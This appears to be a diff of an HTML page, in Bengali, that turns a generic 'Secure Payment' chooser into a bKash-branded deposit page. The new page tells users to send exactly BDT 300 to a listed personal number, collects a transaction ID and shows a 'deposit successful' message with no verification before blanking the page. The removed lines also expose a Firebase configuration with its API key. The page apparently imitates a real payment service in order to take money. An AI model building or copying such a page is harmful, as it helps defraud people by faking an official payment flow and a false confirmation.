@@ -3,248 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dynamic Secure Payment - Big UI</title>
+    <title>bKash Payment</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-        }
-
-        body {
-            background-color: #f4f7fa;
-            display: flex;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        .main-container {
-            background-color: #ffffff;
-            width: 100%;
-            max-width: 550px; 
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
-        }
-
-        /* সফল মেসেজ */
-        #success-msg {
+        body { margin: 0; font-family: Arial, sans-serif; background-color: #f5f5f5; position: relative; }
+        
+        /* Success Message Styling */
+        #success-box {
             display: none;
-            background-color: #4CAF50;
-            color: white;
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            padding: 15px;
             text-align: center;
-            padding: 20px;
             font-weight: bold;
-            font-size: 20px;
-            position: sticky;
+            position: fixed;
             top: 0;
-            z-index: 100;
+            width: 100%;
+            z-index: 1000;
+            box-sizing: border-box;
+            font-size: 14px;
         }
 
-        .top-nav {
-            padding: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #eee;
-        }
+        .header { background-color: #006a4e; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .header-info h2 { margin: 0; font-size: 24px; }
+        .header-info p { margin: 5px 0 0; font-size: 14px; }
+        .service-badge { background: white; color: #006a4e; padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 14px; }
+        
+        .container { padding: 20px; max-width: 500px; margin: auto; }
+        .warning-text { color: #d12053; text-align: center; font-weight: bold; font-size: 15px; margin-bottom: 20px; line-height: 1.4; }
+        
+        .bkash-bar { background-color: #d12053; color: white; display: flex; align-items: center; padding: 12px 20px; border-radius: 8px; margin-bottom: 25px; }
+        .bkash-logo { background: white; border-radius: 50%; width: 45px; height: 45px; display: flex; justify-content: center; align-items: center; margin-right: 15px; }
+        .bkash-logo img { width: 35px; }
+        .bkash-bar span { font-size: 20px; font-weight: bold; }
 
-        /* সিলেকশন পেজ ডিজাইন */
-        .header-section { text-align: center; margin: 25px 0; }
-        .amount-display-small {
-            background-color: #0d47a1;
-            color: white;
-            width: 60%; 
-            margin: 0 auto 30px;
-            padding: 12px;
-            text-align: center;
-            border-radius: 50px;
-            font-size: 22px;
-            font-weight: bold;
-        }
-
-        .gateway-grid { 
-            display: grid; 
-            grid-template-columns: 1fr 1fr; 
-            gap: 20px; 
-            padding: 0 30px; 
-        }
-
-        .gateway-item { 
-            border: 2px solid #eceff1; 
-            border-radius: 20px; 
-            padding: 25px; 
-            display: flex; 
-            justify-content: center; 
-            cursor: pointer; 
-            transition: 0.3s;
-        }
-
-        .gateway-item:hover { border-color: #0d47a1; background: #f9fcff; }
-        .gateway-item img { max-width: 100px; height: auto; }
-
-        /* পেমেন্ট পেজ - অনেক বড় করা হয়েছে */
-        #selection-page, #bkash-page, #nagad-page { display: none; }
-        .active { display: block !important; }
-
-        .instruction-box { 
-            margin: 0 15px; 
-            padding: 40px 25px; 
-            border-radius: 20px; 
-            color: white; 
-            min-height: 500px; /* পেজ বড় করার জন্য */
-        }
-        .bkash-bg { background-color: #d12053; }
-        .nagad-bg { background-color: #d10000; }
-
-        .trnx-input { 
-            width: 100%; 
-            padding: 22px; 
-            border-radius: 12px; 
-            border: none; 
-            margin-bottom: 30px; 
-            font-size: 22px; 
-            text-align: center; 
-            font-weight: bold;
-            outline: none;
-        }
-
-        .instruction-list { list-style: none; font-size: 18px; line-height: 2; }
-        .instruction-list li { border-bottom: 1px solid rgba(255,255,255,0.2); padding-bottom: 15px; margin-bottom: 15px; }
-        .highlight-yellow { color: #ffeb3b; font-weight: bold; font-size: 20px; }
-
-        .copy-btn { background: #fff; color: #333; border: none; padding: 6px 12px; border-radius: 6px; font-size: 13px; cursor: pointer; margin-top: 8px; font-weight: bold; }
-
-        .verify-btn { 
-            background-color: #b71c1c; 
-            color: white; 
-            width: calc(100% - 30px); 
-            padding: 22px; 
-            margin: 30px 15px; 
-            border-radius: 12px; 
-            font-weight: bold; 
-            border: none; 
-            cursor: pointer; 
-            font-size: 22px; 
-        }
-
-        .footer-action { position: absolute; bottom: 0; width: 100%; background-color: #e3f2fd; padding: 30px; text-align: center; border-top: 1px solid #d1e3ff; }
+        .number-box { display: flex; border: 1px solid #ddd; border-radius: 5px; background: white; margin-bottom: 20px; }
+        .number-box input { flex: 1; padding: 15px; border: none; font-size: 18px; font-weight: bold; outline: none; }
+        .copy-btn { padding: 0 20px; border-left: 1px solid #ddd; background: #f9f9f9; cursor: pointer; display: flex; align-items: center; }
+        
+        .input-field { width: 100%; padding: 15px; border: 2px solid #d12053; border-radius: 5px; box-sizing: border-box; font-size: 16px; margin-bottom: 30px; outline: none; }
+        .confirm-btn { width: 100%; padding: 15px; background: white; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        
+        .notice-section { margin-top: 40px; font-size: 13px; color: #444; }
+        .notice-red { color: #f19595; margin-bottom: 15px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <div id="success-msg">✅ সফল! আপনার তথ্য জমা হয়েছে।</div>
+    <div id="success-box">
+        আপনার ডিপোজিট সাকসেস হয়েছে অনুগ্রহ করে ২ থেকে ৩ মিনিট অপেক্ষা করুন
+    </div>
 
-        <div class="top-nav">
-            <span onclick="goToHome()" style="cursor: pointer; font-size: 28px;">🏠</span>
-            <div style="display: flex; gap: 20px;"><span>🌐</span><span style="font-size: 24px;">✕</span></div>
+    <div class="header">
+        <div class="header-info">
+            <h2>BDT 300</h2>
+            <p>কম বা বেশি সেন্টমানি করবেন না</p>
+        </div>
+        <div><span class="service-badge">Pay</span> SERVICE</div>
+    </div>
+
+    <div class="container">
+        <div class="warning-text">আপনি যদি টাকার পরিমাণ পরিবর্তন করেন (BDT 300), আপনি ক্রেডিট পেতে সক্ষম হবেন না।</div>
+
+        <div class="bkash-bar">
+            <div class="bkash-logo">
+                <img src="https://www.logo.wine/a/logo/BKash/BKash-Icon-Logo.wine.svg" alt="bkash">
+            </div>
+            <span>bkash Deposit</span>
         </div>
 
-        <div id="selection-page" class="active">
-            <div class="header-section">
-                <h2 style="color:#333; font-size: 28px; margin-bottom: 20px;">Secure Payment</h2>
-            </div>
-            <div class="amount-display-small">৳ <span class="amt-txt">0.00</span></div>
-            <p style="text-align: center; margin-bottom: 20px; font-weight: bold; color: #666;">পেমেন্ট মেথড সিলেক্ট করুন</p>
-            <div class="gateway-grid">
-                <div class="gateway-item" onclick="openPage('bkash')">
-                    <img src="https://www.logo.wine/a/logo/BKash/BKash-Logo.wine.svg" alt="bKash">
-                </div>
-                <div class="gateway-item" onclick="openPage('nagad')">
-                    <img src="https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png" alt="Nagad">
-                </div>
-            </div>
-            <div class="footer-action">
-                <span style="color: #0d47a1; font-weight: bold; font-size: 24px;">Pay ৳ <span class="amt-txt">0.00</span></span>
+        <label style="font-weight: bold;">বিকাশ এজেন্ট নাম্বার (Send money)</label>
+        <p style="font-size: 13px; color: #666;">এই BKASH নাম্বারে শুধুমাত্র সেন্টমানি গ্রহণ করা হয়</p>
+        
+        <div class="number-box">
+            <input type="text" value="01321833512" id="numInput" readonly>
+            <div class="copy-btn" onclick="copyNum()">
+                <i class="fa-regular fa-copy"></i>
             </div>
         </div>
 
-        <div id="bkash-page">
-            <div style="text-align: center; margin: 20px 0;"><img src="https://www.logo.wine/a/logo/BKash/BKash-Logo.wine.svg" width="120"></div>
-            <div class="instruction-box bkash-bg">
-                <p style="text-align: center; font-weight: bold; margin-bottom: 25px; font-size: 24px;">বিকাশ ট্রানজেকশন আইডি</p>
-                <input type="text" class="trnx-input" id="bkash-trx" placeholder="TRX ID লিখুন">
-                <ul class="instruction-list">
-                    <li>১. সেন্ড মানি করুন: <span class="highlight-yellow">01708078333</span> <br> <button class="copy-btn" onclick="copyNum('01708078333')">নম্বর কপি করুন</button></li>
-                    <li>২. পরিমাণ: <span class="highlight-yellow">৳ <span class="amt-txt">0.00</span></span></li>
-                    <li>৩. পেমেন্ট শেষে প্রাপ্ত TRX ID এখানে দিন।</li>
-                </ul>
-            </div>
-            <button class="verify-btn" id="btn-bkash">VERIFY PAYMENT</button>
-        </div>
+        <label style="font-weight: bold;">Transaction ID <span style="color: #d12053;">* (required)</span></label>
+        <p style="color: #007bff; font-size: 13px; margin: 5px 0;">ট্রানজেকশন আইডি কিভাবে পাবেন?</p>
+        <input type="text" id="trxInput" class="input-field" placeholder="Transaction ID">
 
-        <div id="nagad-page">
-            <div style="text-align: center; margin: 20px 0;"><img src="https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png" width="140"></div>
-            <div class="instruction-box nagad-bg">
-                <p style="text-align: center; font-weight: bold; margin-bottom: 25px; font-size: 24px;">নগদ ট্রানজেকশন আইডি</p>
-                <input type="text" class="trnx-input" id="nagad-trx" placeholder="TRX ID লিখুন">
-                <ul class="instruction-list">
-                    <li>১. সেন্ড মানি করুন: <span class="highlight-yellow">01708078333</span> <br> <button class="copy-btn" onclick="copyNum('01708078333')">নম্বর কপি করুন</button></li>
-                    <li>২. পরিমাণ: <span class="highlight-yellow">৳ <span class="amt-txt">0.00</span></span></li>
-                    <li>৩. পেমেন্ট শেষে প্রাপ্ত TRX ID এখানে দিন।</li>
-                </ul>
-            </div>
-            <button class="verify-btn" id="btn-nagad">VERIFY PAYMENT</button>
+        <button class="confirm-btn" onclick="showSuccess()">নিশ্চিত</button>
+
+        <div class="notice-section">
+            <p class="notice-red">লেনদেন আইডি সঠিকভাবে পূরণ করতে হবে, অন্যথায় স্কোর ব্যর্থ হবে!!</p>
+            <p>অনুগ্রহ করে নিশ্চিত হয়ে নিন যে আপনি BKASH ওয়ালেট নাম্বারে সেন্টমানি করছেন। এই নাম্বারের অন্য কোন ওয়ালেট থেকে টাকা পাঠালে সেটি গ্রহণযোগ্য হবে না।</p>
         </div>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyDR-xSjjR-EkWo7oAcpgP2xJ32wz17fC1o",
-            authDomain: "fresh-b7ec1.firebaseapp.com",
-            databaseURL: "https://fresh-b7ec1-default-rtdb.firebaseio.com",
-            projectId: "fresh-b7ec1",
-            storageBucket: "fresh-b7ec1.firebasestorage.app",
-            messagingSenderId: "953506022680",
-            appId: "1:953506022680:web:3b7e688ccd95b70cce4a6d"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
-
-        // টাকা সেট করা
-        const amount = new URLSearchParams(window.location.search).get('amount') || "0.00";
-        document.querySelectorAll('.amt-txt').forEach(el => el.innerText = amount);
-
-        // গ্লোবাল ফাংশনগুলো উইন্ডোতে অ্যাড করা (যাতে HTML থেকে কাজ করে)
-        window.openPage = (pageId) => {
-            document.querySelectorAll('.main-container > div[id]').forEach(div => div.classList.remove('active'));
-            document.getElementById(pageId + '-page').classList.add('active');
-            window.scrollTo(0,0);
-        };
-
-        window.goToHome = () => openPage('selection');
-
-        window.copyNum = (num) => {
-            navigator.clipboard.writeText(num);
-            alert("নম্বর কপি হয়েছে: " + num);
-        };
-
-        // ডাটাবেসে পাঠানোর ফাংশন
-        async function handleVerify(method, inputId) {
-            const trxId = document.getElementById(inputId).value;
-            if(trxId.length < 4) { alert("সঠিক TRX ID দিন"); return; }
-
-            try {
-                const newRef = push(ref(db, 'payments'));
-                await set(newRef, {
-                    method, transactionID: trxId, amount, timestamp: Date.now()
-                });
-                document.getElementById('success-msg').style.display = 'block';
-                window.scrollTo(0,0);
-            } catch (e) { alert("Error connecting to Firebase!"); }
+    <script>
+        function copyNum() {
+            var copyText = document.getElementById("numInput");
+            copyText.select();
+            navigator.clipboard.writeText(copyText.value);
+            alert("নাম্বার কপি হয়েছে!");
         }
 
-        document.getElementById('btn-bkash').onclick = () => handleVerify('bKash', 'bkash-trx');
-        document.getElementById('btn-nagad').onclick = () => handleVerify('Nagad', 'nagad-trx');
+        function showSuccess() {
+            var trx = document.getElementById("trxInput").value;
+            if(trx.trim() === "") {
+                alert("ট্রানজেকশন আইডি দিন");
+                return;
+            }
 
+            // উপরে সবুজ লেখা দেখানো
+            var successBox = document.getElementById("success-box");
+            successBox.style.display = "block";
+
+            // ৩ সেকেন্ড পর রিডাইরেক্ট বা পেজ ক্লোজ
+            setTimeout(function(){
+                window.location.href = "about:blank"; 
+            }, 3000);
+        }
     </script>
+
 </body>
 </html>
